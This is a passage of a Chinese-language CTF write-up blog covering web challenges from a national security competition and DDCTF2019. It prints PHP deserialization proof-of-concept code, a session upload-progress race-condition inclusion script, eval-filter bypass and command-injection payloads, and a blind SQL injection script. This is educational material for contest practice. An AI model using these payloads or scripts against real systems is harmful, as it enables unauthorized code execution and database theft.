index.php?file&#x3D;xxx.php --&gt;</span><br><span class="line"> &lt;!--Please get the source of hint.php--&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>第一个绕过点</strong>:通过<code>parse_url</code>函数返回<code>false</code>绕过<code>flag</code>字段的过滤，详解我的这篇博客<a href="http://a1han.top/index.php/2019/04/03/parse_url函数小记/" target="_blank" rel="noopener">http://a1han.top/index.php/2019/04/03/parse_url%e5%87%bd%e6%95%b0%e5%b0%8f%e8%ae%b0/</a></p>
<p><strong>第二个绕过点</strong>:绕过Flag的过滤进入反序列化，这里我们发现有<code>wakeup</code>魔术方法,联想到<code>**CVE-2016-7124**</code>，具体绕过例子：<code>O:6:&quot;sercet&quot;:**1**:</code>，对于一个这样的反序列化，我们需要把<code>1</code>改为<code>2</code>，构造一个虚假的对象数量，使<code>wakeup</code>不能正常被调用。</p>
<p><strong>第三个绕过点</strong>:<code>$this-&gt;token = $this-&gt;token_flag</code>,需要这两个值相等，才能正常读取<code>flag</code>，我们可以利用<code>$this-&gt;token = &amp;$this-&gt;token_flag</code>，构造这两个值始终相等</p>
<p>通过这三点构造<code>Poc</code></p>
<p>第一个<code>Poc</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class Handle&#123;</span><br><span class="line"> private $handle;</span><br><span class="line"> public function __wakeup()&#123;</span><br><span class="line"> foreach(get_object_vars($this) as $k &#x3D;&gt; $v) &#123;</span><br><span class="line"> $this-&gt;$k &#x3D; null;</span><br><span class="line"> &#125;</span><br><span class="line"> echo &quot;Waking up\n&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> public function __construct($handle) &#123;</span><br><span class="line"> $this-&gt;handle &#x3D; $handle;</span><br><span class="line"> &#125;</span><br><span class="line"> public function __destruct()&#123;</span><br><span class="line"> $this-&gt;handle-&gt;getFlag();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line"> public $file;</span><br><span class="line"> public $token;</span><br><span class="line"> public $token_flag;</span><br><span class="line"></span><br><span class="line">function __construct($file)&#123;</span><br><span class="line"> $this-&gt;file &#x3D; $file;</span><br><span class="line"> $this-&gt;token_flag &#x3D; $this-&gt;token &#x3D; md5(rand(1,10000));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">public function getFlag()&#123;</span><br><span class="line"> $this-&gt;token_flag &#x3D; md5(rand(1,10000));</span><br><span class="line"> if($this-&gt;token &#x3D;&#x3D;&#x3D; $this-&gt;token_flag)</span><br><span class="line"> &#123;</span><br><span class="line"> if(isset($this-&gt;file))&#123;</span><br><span class="line"> echo @highlight_file($this-&gt;file,true);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br><span class="line">$a&#x3D;new Flag(&#39;flag.php&#39;);</span><br><span class="line">$a-&gt;token&#x3D;&amp;$a-&gt;token_flag;</span><br><span class="line">$b&#x3D;new Handle($a);</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<p>第二个Poc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Handle&#123;</span><br><span class="line">    private $handle;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        foreach(get_object_vars($this) as $k &#x3D;&gt; $v) &#123;</span><br><span class="line">            $this-&gt;$k &#x3D; null;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;Waking up\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct($handle) &#123;</span><br><span class="line">        $this-&gt;handle &#x3D; $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $token;</span><br><span class="line">    public $token_flag;</span><br><span class="line"></span><br><span class="line">    function __construct($file)&#123;</span><br><span class="line">        $this-&gt;file &#x3D; $file;</span><br><span class="line">        $this-&gt;token_flag &#x3D; $this-&gt;token &#x3D; md5(rand(1,10000));</span><br><span class="line">        $this-&gt;token &#x3D; &amp;$this-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getFlag()&#123;</span><br><span class="line">        $this-&gt;token_flag &#x3D; md5(rand(1,10000));</span><br><span class="line">        if($this-&gt;token &#x3D;&#x3D;&#x3D; $this-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isset($this-&gt;file))&#123;</span><br><span class="line">                echo @highlight_file($this-&gt;file,true);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$flag &#x3D; new Flag(&quot;flag.php&quot;);</span><br><span class="line">$handle &#x3D; new Handle($flag);</span><br><span class="line">echo serialize($handle).&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>第三种Poc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file&#x3D;&quot;flag.php&quot;;</span><br><span class="line">    public $token_flag;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;token&#x3D;&amp;$this-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Handle&#123;</span><br><span class="line">    private $handle;</span><br><span class="line">    public function __construct($handle) &#123;</span><br><span class="line">        $this-&gt;handle &#x3D; $handle; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b&#x3D;new Handle(new Flag);</span><br><span class="line">print serialize($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里还可以把<code>construct</code>的参数<code>$handle</code>去掉去构造<code>Poc</code>，<strong>通过这道题我们不难看出，在php反序列化中construct的操作性是很强的，我们可以去掉construct魔术方法的参数，可以对任意对象的值进行修改，可以新增变量以及对变量赋值。</strong></p>
<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p><strong>利用条件竞争包含session文件</strong></p>
<p>这个是从这位师傅这里学到的<a href="http://12end.xyz/essay1/" target="_blank" rel="noopener">http://12end.xyz/essay1/</a>涨了很多姿势</p>
<p>首先我们来介绍一下这个漏洞原理(先看一下Session信息)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2qx32jlqzj31310bemyj.jpg" alt=""></p>
<p>漏洞点在于<code>session_upload_progress.enabled</code>为<code>On</code>时，<strong>当一个上传请求在处理中，如果Post一个与session.upload_progress.name值相同的变量，会自动添加到Session中去，所以我们可以通过这种方法来添加Session数据，并且数据会储存在session_save_path(文件包含利用点)，并且PHP_SESSION_UPLOAD_PROGRESS是一个常量，是session.upload_progress.name的默认值</strong></p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#39;</span><br><span class="line">r&#x3D;requests.session()</span><br><span class="line">headers&#x3D;&#123;</span><br><span class="line">    &quot;Cookie&quot;:&#39;PHPSESSID&#x3D;123&#39;</span><br><span class="line">&#125;</span><br><span class="line">def POST():</span><br><span class="line">    while True:</span><br><span class="line">        file&#x3D;&#123;</span><br><span class="line">            &quot;upload&quot;:(&#39;&#39;,&#39;&#39;)                                                    #上传无效的空文件</span><br><span class="line">        &#125;</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#39;&lt;?php readfile(&quot;.&#x2F;flag.php&quot;);?&gt;&#39;     #恶意进度信息，readfile将直接输出文件内容</span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files&#x3D;file,headers&#x3D;headers,data&#x3D;data)</span><br><span class="line"></span><br><span class="line">def READ():</span><br><span class="line">    while True:</span><br><span class="line">        event.wait()</span><br><span class="line">        t&#x3D;r.get(&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?file&#x3D;..&#x2F;tmp&#x2F;tmp&#x2F;sess_123&quot;)</span><br><span class="line">        if &#39;flag&#39; not in t.text:</span><br><span class="line">            print(&#39;[+]retry&#39;)</span><br><span class="line">        else:</span><br><span class="line">            print(t.text)</span><br><span class="line">            event.clear()</span><br><span class="line">event&#x3D;threading.Event()</span><br><span class="line">event.set()</span><br><span class="line">threading.Thread(target&#x3D;POST,args&#x3D;()).start()</span><br><span class="line">threading.Thread(target&#x3D;READ,args&#x3D;()).start()</span><br><span class="line">threading.Thread(target&#x3D;READ,args&#x3D;()).start()</span><br><span class="line">threading.Thread(target&#x3D;READ,args&#x3D;()).start()</span><br></pre></td></tr></table></figure>

<p>在本地实验最终获得<code>Flag</code></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2qx4gp5n5j31fg0lbdiq.jpg" alt=""></p>
<p>对于本题目的思考:本题的非预期解是有一定的限制的，这里的<code>session储存文件路径</code>是默认的，而且<code>enable</code>选项是开启的(一般也都是开启的)，<strong>而且最重要的是没有设置session，让我们可以通过自己设置session进而包含session文件。</strong></p>
<h3 id="Lovemath"><a href="#Lovemath" class="headerlink" title="Lovemath"></a>Lovemath</h3><p>没做出来的题目,做一下记录。</p>
<p>题目源码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    &#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">    if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">        $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">        if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">            die(&quot;太长了不会算&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">            if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">                die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">        $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">        preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);</span><br><span class="line">        foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">            if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">                die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;帮你算出答案</span><br><span class="line">        eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>本题的绕过点有两个:<strong>第一个也就是长度限制，第二个是关键字符限制。</strong></p>
<p><strong>第一种解法：</strong></p>
<p>这里索要用到最重要的两个函数是<code>base_convert</code>与<code>hex2bin(自己构造--将十六进制转化为字符串)</code>与<code>dechex</code></p>
<p>考虑到字符的数量的限制，我们可以用<code>post</code>或者<code>get</code>，这样就可以将一部分内容放在<code>post</code>或<code>get</code>中，首先要去构造<code>_GET</code>,仅仅通过<code>base_convert</code>是肯定构造不出来的，因为<strong>没有任何进制中是有特殊字符的。</strong>这里学习到了一波<code>hex2bin</code>这个强大的函数–<code>将十六进制值转化为二进制字符串</code>。官方文档中例子如下：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2qx95xqo6j31030cv0th.jpg" alt=""></p>
<p>很明显这个函数可以转化出带有<strong>特殊字符</strong>的字符串。转化脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">print libnum.s2n(&#39;_GET&#39;)</span><br></pre></td></tr></table></figure>

<p>先转化出<code>_GET</code>的十进制值<code>1598506324</code>，而后在php中进行进一步操作,而且<code>hex2bin</code>可以通过<code>base_convert去</code>构造，最终paylaod为：<code>base_convert(37907361743,10,36)(dechex(1598506324));</code>相当于<code>_GET</code>。</p>
<p>第二个需要知道的知识点为：用<code>{}</code>代替<code>[]</code>进行索引(只适用于高版本php)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rk6ykt0qj315e0imag7.jpg" alt=""></p>
<p>我们可以很明显的看到{}成功进行了索引。</p>
<p>最终payload为<code>abs=flag.php&amp;pow=show_source&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pow}($$pi{abs})</code></p>
<p>成功得到flag</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rk8ocklej30yh0h1t98.jpg" alt=""></p>
<p>最后对<code>eval和system</code>进行了一下探究,代码如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;eval命令回显:&quot;;</span><br><span class="line">eval(&#39;echo &#39;.$_GET[&#39;a&#39;].&#39;;&#39;);</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">echo &quot;system命令回显:&quot;;</span><br><span class="line">system(&#39;echo &#39;.$_GET[&#39;b&#39;].&#39;;&#39;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对于<code>eval</code>:将内部命令视为<strong>php代码</strong>去执行，并且一定要有分号结尾，例如可以通过<code>payload:1;system(&#39;whoami&#39;)</code>；去执行系统命令。还可以自由的进入和离开php模式，例如<code>payload:1;?&gt;&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
<p>对于<code>system</code>:将内部命令当作<code>系统命令</code>去执行(这里就可以祭出我们的金手指<code>%0a</code>了)</p>
<p>,例如我们可以通过<code>1;whoami</code>去执行系统命令，也可以使用<code>1%0awhoami</code>去执行系统命令</p>
<p><strong>第二种解法：</strong></p>
<p>利用<code>getallheaders</code>从<code>header</code>里提取所需执行命令，例如<code>payload:system(getallheaders(){9})</code>,在header里面添加<code>9:cat flag.php</code>，偷一下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190423105229-d59634a6-6572-1.png" alt="img"></p>
<p><code>getallheaders</code>这个姿势对于执行<code>php代码</code>的命令执行函数是相当有用的.如下</p>
<h3 id="全宇宙最简单的SQL注入"><a href="#全宇宙最简单的SQL注入" class="headerlink" title="全宇宙最简单的SQL注入"></a>全宇宙最简单的SQL注入</h3><p>又是一道没做出来的题(–菜),此题的问题出现在对于<strong>盲注报错的问题，</strong><code>对于盲注而言，如果ascii值不是正确的话，是不会报错的，返回的是empty set</code>。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkaimxe1j30n90cr795.jpg" alt=""></p>
<p>题目过滤了<code>benchmark if sleep</code>等盲注关键字，所以这里应该只能用布尔盲注了。并且在<code>username</code>处存在注入。</p>
<p>返回信息共有两种情况:</p>
<ul>
<li><strong>数据库操作错误</strong>:当输入<code>username=admin&#39;&amp;passwd=xxx</code>,也就是说当有sql语法错误时会回显数据库操作错误。</li>
<li><strong>登陆失败</strong>：当输入<code>username=admin&amp;passwd=xxx</code>,也就是说当没有sql语法错误时回显登陆失败</li>
</ul>
<p><code>and短路运算</code>：<strong>当and前面的值为假时不会再去运算and后面的表达式。</strong></p>
<p>之前其实只懂报错注入，但不太明白<strong>溢出报错与语法报错</strong>到底有什么区别，通过这道题大概明白了一些问题。如下可见</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkbbjaivj30nd08ltcy.jpg" alt=""></p>
<p>当我们想用<code>updatexml</code>进行报错的时候，无论中间的语句是<code>1=0</code>还是<code>1=1</code>，都会报错，这是因为<strong>利用语法报错的话，只要有语法错误就一定会报错。</strong></p>
<p>而溢出报错却会因为<code>and短路运算</code>而回显不一样的结果，如果前面的语句为假，则不会再执行后面的语句，但这里我发现了一个不是很懂的问题吧</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkc1ldt2j30n906rjuj.jpg" alt=""></p>
<p>首先对于1，2，<code>and短路运算</code>的真假指的是<code>1=0，1=1</code>，也就是说当1=0时，出现了假条件，不会去执行后面的溢出一句，<strong>但是对于下面的两句，个人认为应该是因为只要进行了一次查询就代表着前面的值为真，所以一定会执行后面的溢出语句。</strong></p>
<p>下面可以直接构造<code>payload</code>了，由于<code>or</code>被过滤了，那么<code>information_schema</code>和<code>password</code>字段就不可用了，所以这里还要进行学习一下<strong>Mysql如何在无列名的情况下完成注入，</strong>其实很简单的，放个截图就懂了。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkcr0gnaj313p0k7n6q.jpg" alt=""></p>
<p>还有个坑点…表名要靠猜…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; and substr((select username from user),1,1)&#x3D;&#39;u&#39; and pow(999,100)</span><br></pre></td></tr></table></figure>

<p>返回数据库操作错误，也就意味着表名确实是<code>user</code>。写脚本跑一下user表里面的password字段。</p>
<p>太懒了(贴一下网上的脚本)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;39.97.167.120:52105&quot;</span><br><span class="line">admin_pass &#x3D; &#39;&#39;</span><br><span class="line">charset &#x3D; &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$%&amp;\&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\\]^_&#96;&#125;&#123;~#&#39;</span><br><span class="line">for i in range(1,100):</span><br><span class="line"> for char in charset:</span><br><span class="line"> if char &#x3D;&#x3D; &#39;#&#39;:</span><br><span class="line"> # print(&#39;#&#39;)</span><br><span class="line"> # print(admin_pass)</span><br><span class="line"> exit()</span><br><span class="line"> datas &#x3D; &#123;</span><br><span class="line"> &#39;username&#39; : &quot;admin&#39;^1 and substr((select &#96;2&#96; from (select 1,2 union select * from user)a limit 1,1),%d,1)&#x3D;&#39;%s&#39; and pow(9999,100)#&quot; % (i,char),</span><br><span class="line"> &#39;password&#39; : &#39;admin&#39;</span><br><span class="line"> &#125;</span><br><span class="line"> r &#x3D; requests.post(url&#x3D;url,data &#x3D; datas)</span><br><span class="line"> r.encoding &#x3D; r.apparent_encoding</span><br><span class="line"> if &#39;数据库操作失败&#39; in r.text:</span><br><span class="line"> # print(char)</span><br><span class="line"> admin_pass +&#x3D; char</span><br><span class="line"> print(admin_pass)</span><br><span class="line"> break</span><br></pre></td></tr></table></figure>

<p>逻辑还是很简单的，正常的sql注入脚本。主要是想记录一下其他师傅的姿势，利用其他函数如<code>cot</code>，<code>exp</code>函数进行报错注入，截图如下：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkdkf9utj30sf0gjjwa.jpg" alt=""></p>
<p>其实这里还可以用<code>exp(~(select*from(select user())x));</code>同样可以进行溢出报错。</p>
<h3 id="Refspace"><a href="#Refspace" class="headerlink" title="Refspace"></a>Refspace</h3><p>这道题只做到了利用<code>phar去getshelll</code>，剩下的php学的不到位..连wp看的都很懵.</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/" data-id="ckabsu39d0044kkvr4kyoazs9" class="article-share-link" data-share="baidu" data-title="第十二届信息安全竞赛部分wp">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-DDCTF2019部分wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/DDCTF2019%E9%83%A8%E5%88%86wp/" class="article-date">
  <time datetime="2019-06-01T08:46:16.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/DDCTF2019%E9%83%A8%E5%88%86wp/">DDCTF2019部分wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇WP对于简单部分会略写.</p>
<h3 id="滴"><a href="#滴" class="headerlink" title="滴"></a>滴</h3><p>利用文件包含漏洞读取源代码，最后从博客中看到<code>practice.txt.swp</code>，读取源码，最后是一个简单的变量覆盖漏洞，将两个参数设置为空就行了.</p>
<h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><p>一个比较基础的<code>php反序列化</code>，添加<code>ddctf_username=admin</code>,下面部分有点入坑..,<code>以后能用curl的绝对不用浏览器(真香)</code>，构造<code>sprint-&gt;%s</code>显值，得到<code>key</code>，构造正确的<code>md5</code>并调用反序列化得到<code>Flag.</code></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkyjuuf1j30my0aywfy.jpg" alt=""></p>
<h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><p> 这道题有一个明显的标志：就是可以把上传到服务器上的图片再下载回来，典型的二次渲染，具体原理移步这篇文章讲的很棒<a href="https://xz.aliyun.com/t/2657#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-10</a>首先上传图片下载回来发现</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkzxo46qj30ju0jjdgg.jpg" alt=""></p>
<p><strong>二次渲染无疑了</strong>.<strong>第一种解法：</strong>通过<code>jpg_payload.php</code>来生成包含<code>phpinfo()</code>的图片,命令如:<code>php jpg_payload.php lihuaiqiu.jpg</code>并将图片上传。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl14vjtlj31250jltxj.jpg" alt=""></p>
<p><strong>第二种解法</strong>手工<code>FUZZ</code>，因为没有找到带有<code>diff功能</code>的十六进制编辑器，所以这里盗一下<code>**Glzjin**</code>这位师傅的图。<strong>首先上传一个图片马，下载回来进行对比一波</strong></p>
